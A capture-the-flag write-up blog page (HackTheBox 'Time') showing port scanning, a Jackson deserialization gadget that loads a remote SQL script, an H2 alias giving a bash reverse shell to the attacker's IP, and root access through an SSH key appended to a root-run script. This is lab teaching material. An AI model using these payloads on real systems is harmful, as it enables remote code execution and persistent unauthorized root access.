@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Time Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Time Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Time Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Time is a Linux based machine that was active since October 24th of 2020 to April 4th of 2021, on this machine we will exploit a vulnerability on Java jackson to get SSRF and ultimate RCE, then we will see that a script that we own is ran by root every x seconds, so we add our ssh public key to root’s authorized keys and access as root." />
+<meta property="og:description" content="Time is a Linux based machine that was active since October 24th of 2020 to April 4th of 2021, on this machine we will exploit a vulnerability on Java jackson to get SSRF and ultimate RCE, then we will see that a script that we own is ran by root every x seconds, so we add our ssh public key to root’s authorized keys and access as root." />
+<link rel="canonical" href="http://localhost:8000/Time" />
+<meta property="og:url" content="http://localhost:8000/Time" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/time/time.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-03T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/time/time.png" />
+<meta property="twitter:title" content="Time Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-04-03T00:00:00-05:00","datePublished":"2021-04-03T00:00:00-05:00","description":"Time is a Linux based machine that was active since October 24th of 2020 to April 4th of 2021, on this machine we will exploit a vulnerability on Java jackson to get SSRF and ultimate RCE, then we will see that a script that we own is ran by root every x seconds, so we add our ssh public key to root’s authorized keys and access as root.","headline":"Time Writeup [HTB]","image":"http://localhost:8000/assets/images/time/time.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Time"},"url":"http://localhost:8000/Time"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/time/time.png/../banner.png>
+  
+  <h2>Time Writeup [HTB]</h2>
+  <time datetime="2021-04-03T00:00:00-05:00" class="by-line">03 Apr 2021</time>
+  <p>Time is a Linux based machine that was active since October 24th of 2020 to April 4th of 2021, on this machine we will exploit a vulnerability on Java jackson to get SSRF and ultimate RCE, then we will see that a script that we own is ran by root every x seconds, so we add our ssh public key to root’s authorized keys and access as root.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan -e tun0 --rate=500 -p 0-65535 10.10.10.214
+nmap -sC -sV -p 22,80, -Pn -o scan.txt 10.10.10.214
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Online JSON parser
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>There are only two ports open, ssh and a webpage, let’s check it.</p>
+
+<p><img src="/assets/images/time/webpage.png" alt="" /></p>
+
+<p>The site says “Online JSON beautifier &amp; validator”, the validator function says “beta!” so let’s put a random json text, <code class="language-plaintext highlighter-rouge">{"two":"two"}</code>, we get a message: <code class="language-plaintext highlighter-rouge">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object</code></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>We see that the error is on fasterxml.jackson, after searching for a while we can find a <a href="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96">blog</a> that explains some CVEs on jackson, and <a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">here</a> another one that explains how to exploit the vulnerability, so first we create a file called inject.sql with the next content:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="k">AS</span> <span class="err">$$</span> <span class="n">String</span> <span class="n">shellexec</span><span class="p">(</span><span class="n">String</span> <span class="n">cmd</span><span class="p">)</span> <span class="n">throws</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span> <span class="p">{</span>
+        <span class="n">String</span><span class="p">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="p">{</span><span class="nv">"bash"</span><span class="p">,</span> <span class="nv">"-c"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">};</span>
+        <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">command</span><span class="p">).</span><span class="n">getInputStream</span><span class="p">()).</span><span class="n">useDelimiter</span><span class="p">(</span><span class="nv">"</span><span class="se">\\</span><span class="nv">A"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">hasNext</span><span class="p">()</span> <span class="o">?</span> <span class="n">s</span><span class="p">.</span><span class="k">next</span><span class="p">()</span> <span class="p">:</span> <span class="nv">""</span><span class="p">;</span>  <span class="p">}</span>
+<span class="err">$$</span><span class="p">;</span>
+<span class="k">CALL</span> <span class="n">SHELLEXEC</span><span class="p">(</span><span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.205/54321 0&gt;&amp;1'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We start a http server on port 8000, then we send the next chain on the Validate function: <code class="language-plaintext highlighter-rouge">["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.205:8000/inject.sql'"}]</code></p>
+
+<p>With that we get a shell in the machine and get access to user.txt</p>
+
+<p><img src="/assets/images/time/shell1.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>We upload pspy to the machine to see what is running in the machine, after a short time we see that “/usr/bin/timer_backup.sh” is being ran every x seconds by root.</p>
+
+<p><img src="/assets/images/time/pspy.png" alt="" /></p>
+
+<p>We check that file, and we see that we own it, if we spawn a reverse shell it gets killed after a short time, so let’s generate a ssh key, <code class="language-plaintext highlighter-rouge">ssh-keygen -C root@htb.com</code>, and make that file add our public key to the authorized keys of root, to do that we run <code class="language-plaintext highlighter-rouge">echo 'echo "&lt;public key&gt;" &gt;&gt; /root/.ssh/authorized_keys' &gt;&gt; /usr/bin/timer_backup.sh</code>, when the file is executed we can connect through ssh as root to the machine with the private key.</p>
+
+<p><img src="/assets/images/time/root.png" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#java-deserealization"> Java deserealization</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
